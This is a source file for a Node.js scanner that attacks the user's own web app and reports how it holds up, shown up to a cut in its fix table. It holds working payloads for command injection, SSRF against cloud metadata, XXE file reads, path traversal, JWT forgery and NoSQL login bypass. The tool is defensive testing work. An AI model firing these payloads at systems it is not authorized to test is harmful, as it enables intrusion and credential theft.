#!/usr/bin/env node
// Break My App - throws hostile-but-ordinary traffic at YOUR app, scores how well it survives,
// explains why each failure matters and how to fix it, and records the run as an animated SVG.
// Zero dependencies. Node 18+.  Localhost-only unless you pass --i-own-this for an app you own / may test.

import { writeFileSync } from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import { spawn } from 'node:child_process';

const TTY = process.stdout.isTTY && !process.env.NO_COLOR;
const C = TTY
  ? { r: '\x1b[31m', g: '\x1b[32m', y: '\x1b[33m', b: '\x1b[36m', m: '\x1b[35m', d: '\x1b[2m', B: '\x1b[1m', x: '\x1b[0m' }
  : { r: '', g: '', y: '', b: '', m: '', d: '', B: '', x: '' };

// ---------- args ----------
const args = process.argv.slice(2);
const flag = (n) => args.includes(n);
const opt = (n, def) => { const i = args.indexOf(n); return i >= 0 && args[i + 1] ? args[i + 1] : def; };
const opts = (n) => args.reduce((a, cur, i) => (cur === n && args[i + 1] ? [...a, args[i + 1]] : a), []);
const target = args.find((a) => !a.startsWith('--') && (args.indexOf(a) === 0 || !args[args.indexOf(a) - 1].startsWith('--')));

if (!target || flag('--help')) {
  console.log(`${C.B}Break My App${C.x}  point it at your app, watch it try to break it.

  usage: breakmyapp <url> [options]

  ${C.B}targeting${C.x}
  --routes /a,/b        extra routes to attack (comma separated)
  --delay <ms>          pause between rounds (default 120)
  --i-own-this          allow non-localhost targets (ONLY apps you own or are authorized to test)

  ${C.B}auth${C.x} (to reach logged-in routes of your app)
  --bearer <token>      Authorization: Bearer <token> on every request
  --cookie <string>     Cookie header on every request
  --header "K: V"        extra header (repeatable)
  --login-url <path>    POST --login-body here first, capture the session
  --login-body <json>   JSON credentials for --login-url
  --token-path <path>   dot-path to the token in the login response (e.g. data.accessToken)

  ${C.B}output${C.x}
  --report <file.html>  interactive HTML report that opens in your browser
  --badge <file>        SVG badge (default breakmyapp-badge.svg)
  --cast <file.svg>     record the run as an animated SVG (great for a README)
  --json <file>         full report + fixes as JSON
  --no-open             don't auto-open the HTML report
  --no-fixes            hide the how-to-fix section
  --help`);
  process.exit(target ? 0 : 1);
}

let base;
try { base = new URL(target.startsWith('http') ? target : `http://${target}`); }
catch { console.error('Invalid URL'); process.exit(1); }

const isLocal = ['localhost', '127.0.0.1', '[::1]', '::1'].includes(base.hostname) || base.hostname.endsWith('.localhost');
if (!isLocal && !flag('--i-own-this')) {
  console.error(`${C.r}Refusing to attack ${base.hostname}.${C.x} This tool only targets localhost by default.
It sends real, hostile traffic. Run it ONLY against an app you own or are explicitly authorized to test
(your own deployment, or a target inside a bug-bounty program's defined scope), and re-run with --i-own-this.`);
  process.exit(2);
}

const DELAY = Number(opt('--delay', 120));
const TIMEOUT = 5000;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------- auth ----------
const AUTH = { headers: {} };
if (opt('--bearer')) AUTH.headers['authorization'] = `Bearer ${opt('--bearer')}`;
if (opt('--cookie')) AUTH.headers['cookie'] = opt('--cookie');
for (const h of opts('--header')) { const i = h.indexOf(':'); if (i > 0) AUTH.headers[h.slice(0, i).trim().toLowerCase()] = h.slice(i + 1).trim(); }
const dig = (obj, path) => path.split('.').reduce((o, k) => (o == null ? o : o[k]), obj);
const hasAuth = () => !!(AUTH.headers['authorization'] || AUTH.headers['cookie']);

// ---------- http ----------
function rawHit(url, method, headers, timeout, body) {
  return new Promise((resolve) => {
    const started = Date.now();
    const lib = url.protocol === 'https:' ? https : http;
    const req = lib.request(url, { method, headers, timeout }, (res) => {
      let text = ''; res.on('data', (c) => (text += c));
      res.on('end', () => resolve({ ok: true, status: res.statusCode, text, ms: Date.now() - started, headers: res.headers }));
    });
    req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'timeout', ms: Date.now() - started }); });
    req.on('error', (e) => resolve({ ok: false, error: e.code || e.message, ms: Date.now() - started }));
    if (body) req.write(body);
    req.end();
  });
}
function hget(r, name) { return r.headers?.get ? r.headers.get(name) : r.headers?.[name]; }
function openInBrowser(file) {
  try {
    const p = process.platform;
    const cmd = p === 'win32' ? 'cmd' : p === 'darwin' ? 'open' : 'xdg-open';
    const a = p === 'win32' ? ['/c', 'start', '', file] : [file];
    spawn(cmd, a, { detached: true, stdio: 'ignore' }).unref();
  } catch {}
}

async function hit(path, { method = 'GET', headers = {}, body, timeout = TIMEOUT, noauth = false, raw = false } = {}) {
  const url = new URL(path, base);
  const h = { ...(noauth ? {} : AUTH.headers), ...headers };
  if (method === 'TRACE' || raw) return rawHit(url, method, h, timeout, body); // fetch forbids some headers/methods
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), timeout);
  const started = Date.now();
  try {
    const res = await fetch(url, { method, headers: h, body, signal: ctl.signal, redirect: 'manual' });
    const text = await res.text().catch(() => '');
    return { ok: true, status: res.status, text, ms: Date.now() - started, headers: res.headers };
  } catch (e) {
    return { ok: false, error: ctl.signal.aborted ? 'timeout' : (e.cause?.code || e.message), ms: Date.now() - started };
  } finally { clearTimeout(t); }
}
const alive = async () => (await hit('/', { timeout: 2000 })).ok;

async function login() {
  const url = opt('--login-url');
  if (!url) return { did: false };
  const r = await hit(url, { method: 'POST', headers: { 'content-type': 'application/json' }, body: opt('--login-body', '{}'), noauth: true });
  if (!r.ok || r.status >= 400) return { did: true, ok: false, why: `login returned ${r.ok ? r.status : r.error}` };
  const setCookie = r.headers?.getSetCookie?.() || [];
  if (setCookie.length) AUTH.headers['cookie'] = setCookie.map((c) => c.split(';')[0]).join('; ');
  const tp = opt('--token-path');
  if (tp) { let tok; try { tok = dig(JSON.parse(r.text), tp); } catch {} if (tok) AUTH.headers['authorization'] = `Bearer ${tok}`; else if (!setCookie.length) return { did: true, ok: false, why: `no token at "${tp}"` }; }
  return { did: true, ok: true };
}

const STACK_RE = /(at\s+[\w$.<>]+\s+\(.*:\d+:\d+\)|Traceback \(most recent call last\)|node_modules\/|\.(js|ts|py|rb|go|php):\d+:?\d*|SyntaxError:|TypeError:|ReferenceError:|SQLITE_ERROR|ER_PARSE_ERROR|syntax error at or near|Exception in thread|java\.lang\.|org\.springframework|System\.\w+Exception|panic:|goroutine \d+|Warning: .*on line)/;
const SECRET_RE = /(AKIA[0-9A-Z]{16}|-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----|xox[baprs]-[0-9A-Za-z-]{10,}|ghp_[0-9A-Za-z]{30,}|sk_live_[0-9A-Za-z]{20,})/;
const LFI_RE = /(root:.*:0:0:|\[extensions\]|\[fonts\]|daemon:.*:\/usr\/sbin)/;
const META_RE = /(ami-id|instance-identity|security-credentials|computeMetadata|"AccessKeyId")/;

// ---------- route discovery ----------
async function discover() {
  const routes = new Set(['/']);
  opt('--routes', '').split(',').filter(Boolean).forEach((r) => routes.add(r.startsWith('/') ? r : `/${r}`));
  const home = await hit('/');
  if (home.ok) for (const m of home.text.matchAll(/(?:href|action)=["']([^"'#?]+)["']/gi)) { try { const u = new URL(m[1], base); if (u.origin === base.origin) routes.add(u.pathname); } catch {} }
  for (const p of ['/openapi.json', '/swagger.json', '/api-docs.json']) { const r = await hit(p); if (r.ok && r.status === 200) try { Object.keys(JSON.parse(r.text).paths || {}).forEach((x) => routes.add(x.replace(/\{[^}]+\}/g, '1'))); } catch {} }
  for (const p of ['/api', '/api/users', '/api/items', '/api/orders', '/api/login', '/api/search', '/api/me', '/api/account', '/search', '/login', '/health', '/admin']) { const r = await hit(p); if (r.ok && r.status < 404) routes.add(p); }
  return [...routes].slice(0, 25);
}

// ---------- judging ----------
function judge(r, route, what) {
  if (!r.ok) {
    if (r.error === 'timeout') return { severity: 'high', cat: 'hang', title: `hangs on ${what}`, route, detail: `no response within ${TIMEOUT / 1000}s` };
    return { severity: 'crit', cat: 'crash', title: `connection died on ${what}`, route, detail: String(r.error) };
  }
  if (r.status >= 500) {
    const leak = STACK_RE.test(r.text);
    return { severity: leak ? 'crit' : 'high', cat: leak ? 'stack-leak' : 'error-5xx', title: `${r.status} on ${what}${leak ? ' + leaks internals' : ''}`, route, detail: leak ? r.text.replace(/\s+/g, ' ').slice(0, 120) : 'server error instead of a clean 4xx' };
  }
  if (STACK_RE.test(r.text)) return { severity: 'high', cat: 'stack-leak', title: `leaks internals on ${what}`, route, detail: r.text.replace(/\s+/g, ' ').slice(0, 120) };
  return null;
}

// ---------- payloads ----------
const NASTY = [
  ["'; DROP TABLE users;--", 'SQL-ish string'], ['" OR 1=1 --', 'SQL boolean bypass'],
  ['<script>alert(1)</script>', 'HTML/script injection'], ['A'.repeat(100000), '100KB string'],
  ['\u0000\u0001\u0002', 'control characters'], ['../../../../etc/passwd', 'path traversal probe'],
  ['-1', 'negative number'], ['99999999999999999999999', 'integer overflow'], ['NaN', 'NaN'], ['', 'empty value'],
  ['‮hello', 'bidi override char'], ['𝕏'.repeat(5000), 'wide-unicode flood'],
];
const TRAVERSALS = ['../../../../../../etc/passwd', '..%2f..%2f..%2f..%2fetc%2fpasswd', '....//....//....//etc/passwd', '..\\..\\..\\..\\windows\\win.ini', '/etc/passwd%00.png'];
const REDIR_PARAMS = ['redirect', 'next', 'url', 'return', 'returnTo', 'dest', 'continue', 'r', 'u'];
const SSRF_PARAMS = ['url', 'uri', 'callback', 'webhook', 'image', 'imageUrl', 'src', 'dest', 'feed', 'proxy', 'fetch'];
const INTERNAL_URLS = ['http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'http://metadata.google.internal/computeMetadata/v1/instance/'];
const CMD_KEYS = ['host', 'cmd', 'name', 'ip', 'target', 'q', 'domain'];

// ---------- attackers ----------
// route attackers: run(route, log). host attackers: run(routes, log). `when` gates optional ones.
const attackers = [
  { name: 'The Fuzzer', icon: '🧪', scope: 'route', async run(route, log) {
    for (const [p, label] of NASTY) {
      const q = await hit(`${route}${route.includes('?') ? '&' : '?'}q=${encodeURIComponent(p)}&id=${encodeURIComponent(p)}`); const f = judge(q, route, `query with ${label}`); if (f) log(f);
      const b = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: p, id: p, email: p }) }); const f2 = judge(b, route, `JSON body with ${label}`); if (f2) log(f2);
      if (!(await alive())) break;
    }
  } },
  { name: 'The Mirror', icon: '🪞', scope: 'route', async run(route, log) {
    const marker = 'bmx' + Math.random().toString(36).slice(2, 6);
    const payload = `${marker}"><svg/onload=1>${marker}`;
    const r = await hit(`${route}${route.includes('?') ? '&' : '?'}q=${encodeURIComponent(payload)}&name=${encodeURIComponent(payload)}`);
    const ct = r.ok ? (hget(r, 'content-type') || '') : '';
    if (r.ok && /html/.test(ct) && r.text.includes(`${marker}"><svg/onload=1>`)) log({ severity: 'high', cat: 'xss', title: 'reflected XSS (unescaped input in HTML)', route, detail: 'a <svg onload> payload came back unescaped in an HTML response' });
  } },
  { name: 'The Type Confuser', icon: '🎭', scope: 'route', async run(route, log) {
    const bodies = [['null', 'null body'], ['[]', 'array not object'], ['"x"', 'bare string'], ['42', 'bare number'], ['true', 'bare boolean'], ['{"id":{"$ne":null}}', 'NoSQL operator'], ['{"name":["a"],"id":{"x":1}}', 'wrong types'], ['{"broken": ', 'truncated JSON'], ['{' + '"a":{'.repeat(2000) + '}'.repeat(2000) + '}', 'deeply nested JSON']];
    for (const [body, label] of bodies) { const r = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body }); const f = judge(r, route, label); if (f) log(f); if (!(await alive())) break; }
  } },
  { name: 'The Interrogator', icon: '🗿', scope: 'route', async run(route, log) {
    // SSTI: a 7*7 only evaluates to 49 between our markers if a template engine ran it
    const probes = ['bmZ{{7*7}}Zmb', 'bmZ${7*7}Zmb', 'bmZ#{7*7}Zmb', 'bmZ<%= 7*7 %>Zmb'];
    for (const p of probes) {
      const q = await hit(`${route}${route.includes('?') ? '&' : '?'}q=${encodeURIComponent(p)}&name=${encodeURIComponent(p)}`);
      if (q.ok && q.text.includes('bmZ49Zmb')) { log({ severity: 'crit', cat: 'ssti', title: 'server-side template injection', route, detail: '7*7 was evaluated to 49 inside a template' }); return; }
      const b = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: p }) });
      if (b.ok && b.text.includes('bmZ49Zmb')) { log({ severity: 'crit', cat: 'ssti', title: 'server-side template injection', route, detail: '7*7 evaluated to 49 inside a template' }); return; }
    }
  } },
  { name: 'The Smith', icon: '⚒️', scope: 'route', async run(route, log) {
    const m = 'bmapCMD' + Math.random().toString(36).slice(2, 7);
    const payloads = [`;echo ${m};`, `$(echo ${m})`, '`echo ' + m + '`', `|echo ${m}`];
    for (const p of payloads) for (const key of CMD_KEYS) {
      const r = await hit(`${route}${route.includes('?') ? '&' : '?'}${key}=${encodeURIComponent('127.0.0.1' + p)}`);
      // execution prints the bare marker; plain reflection echoes the whole "echo <marker>" payload — ignore that
      if (r.ok && r.text.includes(m) && !r.text.includes('echo ' + m)) { log({ severity: 'crit', cat: 'cmd-injection', title: `OS command injection via ?${key}`, route, detail: 'an injected shell command executed and returned a unique marker' }); return; }
    }
    const t0 = Date.now(); const s = await hit(`${route}${route.includes('?') ? '&' : '?'}host=${encodeURIComponent('127.0.0.1;sleep 5')}`, { timeout: 8000 });
    if (s.ok && Date.now() - t0 > 4500) log({ severity: 'crit', cat: 'cmd-injection', title: 'blind command injection (sleep delay)', route, detail: 'a ;sleep 5 payload delayed the response ~5s' });
  } },
  { name: 'The Portal', icon: '🛰️', scope: 'route', async run(route, log) {
    for (const key of SSRF_PARAMS) for (const u of INTERNAL_URLS) {
      const r = await hit(`${route}${route.includes('?') ? '&' : '?'}${key}=${encodeURIComponent(u)}`, { timeout: 7000 });
      if (r.ok && META_RE.test(r.text)) { log({ severity: 'crit', cat: 'ssrf', title: `SSRF via ?${key} reaches cloud metadata`, route, detail: 'the server fetched an internal URL and returned its contents' }); return; }
    }
  } },
  { name: 'The Archivist', icon: '📜', scope: 'route', async run(route, log) {
    const xxe = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`;
    const r = await hit(route, { method: 'POST', headers: { 'content-type': 'application/xml' }, body: xxe });
    if (r.ok && LFI_RE.test(r.text)) log({ severity: 'crit', cat: 'xxe', title: 'XML external entity (XXE) file read', route, detail: 'an external entity returned /etc/passwd contents' });
  } },
  { name: 'The Polluter', icon: '🧬', scope: 'route', async run(route, log) {
    const marker = 'bmap_pp_' + Math.random().toString(36).slice(2, 8);
    for (const body of [`{"__proto__":{"${marker}":"owned"}}`, `{"constructor":{"prototype":{"${marker}":"owned"}}}`]) { const r = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body }); const f = judge(r, route, 'prototype-pollution payload'); if (f) log(f); }
    const check = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"x":1}' });
    if (check.ok && check.text && check.text.includes(marker)) log({ severity: 'crit', cat: 'proto-pollution', title: 'prototype pollution confirmed', route, detail: 'a later plain object surfaced the injected __proto__ property' });
  } },
  { name: 'The Traverser', icon: '🗂️', scope: 'route', async run(route, log) {
    for (const t of TRAVERSALS) for (const key of ['file', 'path', 'name', 'page', 'template', 'id']) {
      const r = await hit(`${route}${route.includes('?') ? '&' : '?'}${key}=${encodeURIComponent(t)}`);
      if (r.ok && LFI_RE.test(r.text)) { log({ severity: 'crit', cat: 'traversal', title: `path traversal via ?${key}`, route, detail: 'response returned OS file contents (/etc/passwd or win.ini)' }); return; }
    }
  } },
  { name: 'The Smuggler', icon: '✂️', scope: 'route', async run(route, log) {
    const r = await hit(`${route}${route.includes('?') ? '&' : '?'}q=x%0d%0aX-Bmap-Injected:1%0d%0a`);
    if (r.ok && hget(r, 'x-bmap-injected')) log({ severity: 'crit', cat: 'crlf-injection', title: 'CRLF header injection (response splitting)', route, detail: 'a newline in input created a new response header' });
  } },
  { name: 'The Redirector', icon: '↪️', scope: 'route', async run(route, log) {
    for (const key of REDIR_PARAMS) for (const evil of ['//evil.example.com', 'https://evil.example.com', '/\\evil.example.com']) {
      const r = await hit(`${route}${route.includes('?') ? '&' : '?'}${key}=${encodeURIComponent(evil)}`);
      const loc = r.ok && hget(r, 'location');
      if (loc && /evil\.example\.com/.test(loc)) { log({ severity: 'high', cat: 'open-redirect', title: `open redirect via ?${key}`, route, detail: `Location sent the browser to ${loc.slice(0, 60)}` }); return; }
    }
  } },
  { name: 'The Impostor', icon: '🪪', scope: 'route', async run(route, log) {
    const r = await hit(route, { raw: true, headers: { host: 'evil.example.com' } });
    if (r.ok && /evil\.example\.com/.test(r.text)) log({ severity: 'high', cat: 'host-header', title: 'Host header reflected into the response', route, detail: 'enables web-cache poisoning / password-reset link poisoning' });
    const loc = r.ok && hget(r, 'location'); if (loc && /evil\.example\.com/.test(loc)) log({ severity: 'high', cat: 'host-header', title: 'Host header reflected into a redirect', route, detail: 'the redirect target is built from an attacker-controlled Host' });
  } },
  { name: 'The Overshare', icon: '🎁', scope: 'route', async run(route, log) {
    const r = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'x', role: 'admin', isAdmin: true, verified: true, id: 999999 }) });
    if (r.ok && r.status < 300 && /("role"\s*:\s*"admin"|"isAdmin"\s*:\s*true|"verified"\s*:\s*true)/.test(r.text)) log({ severity: 'med', cat: 'mass-assignment', title: 'privileged fields accepted', route, detail: 'role/isAdmin/verified were echoed back as set — possible mass assignment (verify)' });
  } },
  { name: 'The Method Menace', icon: '🔨', scope: 'route', async run(route, log) {
    for (const method of ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']) { const r = await hit(route, { method }); if (r.ok && r.status >= 500) log({ severity: 'high', cat: 'method-not-handled', title: `${method} returns ${r.status} instead of 405`, route, detail: 'unhandled method crashes the handler' }); else { const f = judge(r, route, `unexpected ${method}`); if (f) log(f); } }
  } },
  { name: 'The Header Goblin', icon: '👺', scope: 'route', async run(route, log) {
    const sets = [[{ 'content-type': 'text/plain; charset=utf-7' }, 'weird charset'], [{ 'x-forwarded-for': '1.1.1.1,'.repeat(500) }, 'huge x-forwarded-for'], [{ 'x-forwarded-host': 'evil.example.com' }, 'spoofed forwarded-host'], [{ 'content-type': 'multipart/form-data; boundary=' }, 'broken multipart'], [{ accept: '*/*;q=' + '9'.repeat(2000) }, 'garbage accept'], [{ cookie: 'a=' + 'b'.repeat(8000) }, '8KB cookie']];
    for (const [headers, label] of sets) { const r = await hit(route, { method: 'POST', headers, body: 'x=1' }); const f = judge(r, route, label); if (f) log(f); }
    const g = await hit(route); if (g.ok) { const tell = hget(g, 'x-powered-by') || (/\d/.test(hget(g, 'server') || '') ? hget(g, 'server') : null); if (tell) log({ severity: 'med', cat: 'verbose-headers', title: `advertises its stack: ${tell}`, route, detail: 'version banners help attackers pick exploits' }); }
  } },
  { name: 'The Heavyweight', icon: '🏋️', scope: 'route', async run(route, log) {
    const r = await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ blob: 'x'.repeat(5 * 1024 * 1024) }), timeout: 10000 });
    if (r.ok && r.status < 400) log({ severity: 'med', cat: 'no-body-limit', title: 'accepts a 5MB body', route, detail: `HTTP ${r.status} — no request-size cap` });
    else { const f = judge(r, route, '5MB body'); if (f) log(f); }
  } },
  { name: 'The Slowburn', icon: '🐌', scope: 'route', async run(route, log) {
    const tame = await hit(`${route}${route.includes('?') ? '&' : '?'}q=aaaaaaaaaa`);
    const evil = await hit(`${route}${route.includes('?') ? '&' : '?'}q=${encodeURIComponent('a'.repeat(50) + '!' + '('.repeat(50))}`, { timeout: 8000 });
    if (tame.ok && !evil.ok && evil.error === 'timeout') log({ severity: 'high', cat: 'redos', title: 'a crafted input makes the endpoint hang', route, detail: 'tame input fast, adversarial input timed out — possible ReDoS' });
    else if (tame.ok && evil.ok && evil.ms > 1500 && evil.ms > tame.ms * 20) log({ severity: 'med', cat: 'redos', title: `adversarial input ${Math.round(evil.ms / Math.max(tame.ms, 1))}x slower`, route, detail: `${tame.ms}ms vs ${evil.ms}ms — possible complexity issue` });
  } },
  { name: 'The Enumerator', icon: '🔢', scope: 'route', when: () => hasAuth(), async run(route, log) {
    const m = route.match(/^(.*\/)(\d+)(\/?)$/); if (!m) return;
    const mine = await hit(route); if (!mine.ok || mine.status >= 300 || !mine.text) return;
    const other = await hit(`${m[1]}${Number(m[2]) + 1}${m[3]}`);
    if (other.ok && other.status < 300 && other.text && other.text !== mine.text && other.text.length > 2) log({ severity: 'high', cat: 'bola', title: `object-level access not scoped (id ${m[2]}→${Number(m[2]) + 1})`, route, detail: 'a different object id returned a different record for the same session — verify it is not another user\'s data' });
  } },
  { name: 'The Impersonator', icon: '🎫', scope: 'host', when: () => (AUTH.headers['authorization'] || '').split('.').length === 3, async run(routes, log) {
    const jwt = AUTH.headers['authorization'].replace(/^Bearer /, '');
    const [, payload] = jwt.split('.');
    const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
    const forged = [[`${b64({ alg: 'none', typ: 'JWT' })}.${payload}.`, 'alg:none forged token'], [`${jwt.split('.').slice(0, 2).join('.')}.`, 'signature stripped']];
    // find a genuinely protected route: 2xx with our token, 401/403 without it
    let pr = null, authed = null;
    for (const r of routes) { const w = await hit(r); if (!w.ok || w.status >= 300) continue; const n = await hit(r, { noauth: true }); if (n.ok && (n.status === 401 || n.status === 403)) { pr = r; authed = w; break; } }
    if (!pr) return; // nothing to bypass (either all public or all locked) — not this attacker's call
    for (const [tok, label] of forged) { const r = await hit(pr, { headers: { authorization: `Bearer ${tok}` }, noauth: true }); if (r.ok && r.status < 300 && r.text === authed.text) { log({ severity: 'crit', cat: 'jwt-alg-none', title: `accepts a ${label}`, route: pr, detail: 'the server did not verify the JWT signature' }); return; } }
  } },
  { name: 'The Racer', icon: '🏁', scope: 'route', async run(route, log) {
    const N = 25;
    const results = await Promise.all(Array.from({ length: N }, () => hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'race', amount: 1 }) })));
    const statuses = new Map(); results.forEach((r) => statuses.set(r.ok ? r.status : r.error, (statuses.get(r.ok ? r.status : r.error) || 0) + 1));
    const crashed = results.filter((r) => !r.ok || r.status >= 500).length;
    if (crashed) log({ severity: 'high', cat: 'error-5xx', title: `${crashed}/${N} simultaneous requests failed`, route, detail: [...statuses].map(([k, v]) => `${k}×${v}`).join(' ') });
    if (results.every((r) => r.ok && r.status < 300)) {
      const seq = []; for (let i = 0; i < 5; i++) seq.push(await hit(route, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'race', amount: 1 }) }));
      const seqDistinct = new Set(seq.filter((r) => r.ok && r.status < 300).map((r) => r.text)).size;
      const conDistinct = new Set(results.map((r) => r.text)).size;
      if (seqDistinct === 5 && conDistinct < N) log({ severity: 'high', cat: 'race', title: `possible lost update: ${N} concurrent gave only ${conDistinct} distinct results`, route, detail: 'sequential calls change state; concurrent ones collide (read-modify-write race?)' });
    }
  } },
  { name: 'The Snoop', icon: '🔎', scope: 'host', async run(routes, log) {
    const paths = [['/.env', /(KEY|SECRET|PASSWORD|TOKEN)\s*=/i, 'crit'], ['/.git/HEAD', /ref:\s*refs\//, 'crit'], ['/.git/config', /\[core\]/, 'crit'], ['/.aws/credentials', /aws_access_key_id/i, 'crit'], ['/id_rsa', /PRIVATE KEY/, 'crit'], ['/backup.sql', /(INSERT INTO|CREATE TABLE)/i, 'crit'], ['/wp-config.php', /DB_PASSWORD/, 'crit'], ['/docker-compose.yml', /services:/, 'high'], ['/.DS_Store', /Bud1/, 'med']];
    for (const [p, re, sev] of paths) { const r = await hit(p); if (r.ok && r.status === 200 && re.test(r.text)) log({ severity: sev, cat: 'sensitive-file', title: `exposes ${p}`, route: p, detail: 'this file is reachable over HTTP and leaks internals/secrets' }); }
    const home = await hit('/'); if (home.ok && SECRET_RE.test(home.text)) log({ severity: 'crit', cat: 'secret-leak', title: 'a secret/key appears in a response body', route: '/', detail: (home.text.match(SECRET_RE) || [''])[0].slice(0, 24) + '…' });
  } },
  { name: 'The Cartographer', icon: '🗺️', scope: 'host', async run(routes, log) {
    const q = JSON.stringify({ query: '{__schema{types{name}}}' });
    for (const p of ['/graphql', '/api/graphql', '/query', '/v1/graphql']) { const r = await hit(p, { method: 'POST', headers: { 'content-type': 'application/json' }, body: q }); if (r.ok && /"__schema"|"types"\s*:/.test(r.text)) { log({ severity: 'med', cat: 'graphql-introspection', title: `GraphQL introspection enabled at ${p}`, route: p, detail: 'the full schema is queryable — disable introspection in production' }); return; } }
  } },
  { name: 'The Spelunker', icon: '🔦', scope: 'host', async run(routes, log) {
    const probes = [['/actuator/env', /activeProfiles|propertySources/, 'crit'], ['/actuator/health', /"status"\s*:\s*"UP"/, 'med'], ['/phpinfo.php', /PHP Version/, 'high'], ['/server-status', /Apache Server Status/, 'med'], ['/metrics', /# HELP|# TYPE/, 'med'], ['/_debug', /debug|trace/i, 'med']];
    for (const [p, re, sev] of probes) { const r = await hit(p); if (r.ok && r.status === 200 && re.test(r.text)) log({ severity: sev, cat: 'debug-endpoint', title: `exposes ${p}`, route: p, detail: 'a debug/management endpoint is reachable and leaks internals' }); }
  } },
  { name: 'The Gatekeeper', icon: '🧱', scope: 'host', async run(routes, log) {
    const r = await hit('/'); if (!r.ok) return;
    if (!hget(r, 'x-content-type-options')) log({ severity: 'med', cat: 'security-headers', title: 'missing X-Content-Type-Options: nosniff', route: '/', detail: 'browsers may MIME-sniff responses into executable types' });
    if (!hget(r, 'x-frame-options') && !/frame-ancestors/i.test(hget(r, 'content-security-policy') || '')) log({ severity: 'med', cat: 'clickjacking', title: 'no clickjacking protection', route: '/', detail: 'missing X-Frame-Options and CSP frame-ancestors — page can be iframed' });
    if (base.protocol === 'https:' && !hget(r, 'strict-transport-security')) log({ severity: 'med', cat: 'security-headers', title: 'missing HSTS', route: '/', detail: 'no Strict-Transport-Security on an HTTPS site' });
    const cors = await hit('/', { headers: { origin: 'https://evil.example.com' } });
    const acao = hget(cors, 'access-control-allow-origin'), acac = hget(cors, 'access-control-allow-credentials');
    if (acao === 'https://evil.example.com' && String(acac) === 'true') log({ severity: 'high', cat: 'cors', title: 'CORS reflects any origin WITH credentials', route: '/', detail: 'any site can read authenticated responses cross-origin' });
    else if (acao === '*') log({ severity: 'med', cat: 'cors', title: 'CORS allows any origin (*)', route: '/', detail: 'fine for public data, dangerous if responses are user-specific' });
    const sc = r.headers?.getSetCookie?.() || [];
    for (const c of sc) { const low = c.toLowerCase(); const miss = ['httponly', 'secure', 'samesite'].filter((k) => !low.includes(k)); if (miss.length) { log({ severity: 'med', cat: 'insecure-cookie', title: `cookie missing ${miss.join(', ')}`, route: '/', detail: c.split(';')[0].split('=')[0] + ' — theft/CSRF exposure' }); break; } }
  } },
  { name: 'The Keymaster', icon: '🗝️', scope: 'host', async run(routes, log) {
    const lr = opt('--login-url') || routes.find((r) => /login|signin|auth/i.test(r)); if (!lr) return;
    const J = (b) => ({ method: 'POST', headers: { 'content-type': 'application/json' }, body: b, noauth: true });
    const bad = await hit(lr, J('{"email":"no-such-user@bmap.test","password":"definitely-wrong-xyz"}'));
    if (!bad.ok || bad.status < 400) return; // no failing baseline — skip to avoid noise
    for (const op of ['{"email":{"$ne":null},"password":{"$ne":null}}', '{"email":"admin","password":{"$gt":""}}']) {
      const r = await hit(lr, J(op));
      if (r.ok && r.status < 300 && /token|session|jwt|success|"id"/i.test(r.text)) { log({ severity: 'crit', cat: 'nosql-injection', title: 'authentication bypass via NoSQL operator', route: lr, detail: 'a {"$ne":null}-style credential logged in where a wrong password was rejected' }); return; }
    }
  } },
  { name: 'The Bouncer', icon: '🚪', scope: 'host', async run(routes, log) {
    const r = routes.find((x) => /login|auth|token|signin/i.test(x)) || '/';
    const burst = await Promise.all(Array.from({ length: 40 }, () => hit(r, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"email":"a@b.c","password":"wrong"}' })));
    if (!burst.some((x) => x.ok && (x.status === 429 || x.status === 503))) log({ severity: 'med', cat: 'no-rate-limit', title: `40 rapid requests to ${r}, none throttled`, route: r, detail: 'no rate limiting — brute force and credential stuffing are unimpeded' });
  } },
];

// ---------- fixes ----------
const FIXES = {
  'crash': ['The process (or socket) died on a malformed request — a full availability bug.', 'Add a global error boundary (Express error middleware; process.on("unhandledRejection"/"uncaughtException") that logs and keeps serving).'],
  'hang': ['A request never returned; a payload reached a slow/infinite path.', 'Set per-request timeouts, cap input length, bound every loop, audit regexes for catastrophic backtracking.'],
  'stack-leak': ['The response body contains a stack trace or internal path — attackers map your stack and layout from it.', 'Never send error.stack to clients. Log server-side with a request id; return a generic message + that id.'],
  'error-5xx': ['A malformed but ordinary request returned 5xx — the handler threw instead of validating.', 'Validate/parse input in try/catch and return 400. 5xx should mean "we broke", not "you sent something weird".'],
  'no-body-limit': ['The server accepted a multi-MB body; a few such requests exhaust memory.', 'Set a request-size limit (express.json({limit:"100kb"}), proxy client_max_body_size).'],
  'race': ['Concurrent identical requests collided — read-modify-write without locking (double-spend territory).', 'Use atomic DB ops / transactions / optimistic locking (WHERE version = ?) instead of read-then-write in app code.'],
  'proto-pollution': ['A __proto__/constructor payload reached object-merge code and polluted Object.prototype globally.', 'Reject __proto__/constructor keys, validate with a schema (zod/ajv), or use Object.create(null). Patch merge libs.'],
  'ssti': ['User input was rendered as a template and executed (7*7 became 49) — this usually escalates to full remote code execution.', 'Never put user input into a template string. Pass it as data/variables to the engine; sandbox or disable code evaluation.'],
  'cmd-injection': ['User input reached a shell command — an attacker runs arbitrary OS commands (full server takeover).', 'Never build shell strings from input. Use exec APIs that take an argument array (execFile/spawn without a shell) and allow-list values.'],
